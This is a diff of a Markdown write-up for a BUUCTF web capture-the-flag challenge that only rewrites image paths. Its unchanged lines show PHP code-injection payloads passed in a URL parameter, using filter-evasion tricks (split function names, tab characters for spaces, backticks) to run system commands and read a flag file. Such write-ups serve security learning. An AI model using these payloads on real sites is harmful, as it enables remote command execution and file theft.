@@ -55,9 +55,9 @@ switch($_GET["action"] ?? "") {
 /?action=upload&data=<?=(ph.pinfo)()?>
 ```
 
-![Alt text](G:/CTFWriteUp/buuctf/Web/img/19-1.png)
+![](./img/19-1.png)
 
-![Alt text](G:/CTFWriteUp/buuctf/Web/img/19-2.png)
+![](./img/19-2.png)
 
 ```url
 ?action=upload&data=<?=system("ls%09/")?>
@@ -65,12 +65,12 @@ switch($_GET["action"] ?? "") {
 /?action=upload&data=`cat%09/flllllll1112222222lag`?>
 ```
 
-![Alt text](G:/CTFWriteUp/buuctf/Web/img/19-3.png)
+![](./img/19-3.png)
 
 ```url
 ?action=upload&data=<?=system("cat%09/flllllll1112222222lag")?>
 ```
 
-![Alt text](G:/CTFWriteUp/buuctf/Web/img/19-4.png)
+![](./img/19-4.png)
 
 [参考文章](https://www.shawroot.cc/1897.html)
